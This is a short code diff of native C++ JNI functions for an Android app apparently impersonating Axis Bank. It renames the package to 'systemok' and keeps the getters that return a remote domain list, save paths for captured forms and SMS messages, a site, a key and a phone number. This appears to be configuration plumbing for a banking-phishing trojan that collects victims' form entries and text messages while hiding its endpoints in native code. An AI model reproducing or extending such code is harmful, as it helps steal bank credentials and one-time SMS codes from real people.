@@ -13,38 +13,38 @@ std::string domainList = "https://dkb0ss2.github.io/checklist/checkMasterS4ve.ht
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_DomainList(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_DomainList(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(domainList.c_str());
 }
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(form_save.c_str());
 }
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(sms_save.c_str());
 }
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_SITE(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_SITE(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(site.c_str());
 }
 
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_KEY(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_KEY(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(KEY.c_str());
 }
 
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_com_axisofbank_german_Helper_getNumber(JNIEnv *env, jobject thiz) {
+Java_com_axisofbank_systemok_Helper_getNumber(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(getNumber.c_str());
 }
